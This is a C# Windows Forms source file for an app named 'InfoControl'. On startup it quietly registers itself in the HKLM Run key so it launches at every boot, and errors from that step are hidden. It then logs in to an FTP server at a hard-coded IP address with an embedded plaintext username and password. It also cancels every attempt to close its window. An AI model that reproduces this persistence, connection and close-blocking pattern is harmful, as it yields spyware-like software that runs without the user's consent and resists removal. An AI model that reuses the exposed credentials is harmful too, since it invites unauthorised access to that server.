using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace InfoControl
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            try
            {
                Microsoft.Win32.RegistryKey myKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);
                myKey.SetValue("Info Control", Application.ExecutablePath);
            }
            catch (Exception e)
            {
                //   MessageBox.Show(e.Message);
            }
            FtpWebRequest directoryListRequest = (FtpWebRequest)WebRequest.Create("ftp://50.116.78.113");
            directoryListRequest.Method = WebRequestMethods.Ftp.ListDirectory;
            directoryListRequest.Credentials = new NetworkCredential("grades1@bigappleacademy.school", "Qutr2ap^zf#q");

            using (FtpWebResponse directoryListResponse = (FtpWebResponse)directoryListRequest.GetResponse())
            {
                using (StreamReader directoryListResponseReader = new StreamReader(directoryListResponse.GetResponseStream()))
                {
                    string responseString = directoryListResponseReader.ReadToEnd();
                    string[] results = responseString.Split(new string[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
        //            return results;
                }
            }
            InitializeComponent();
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
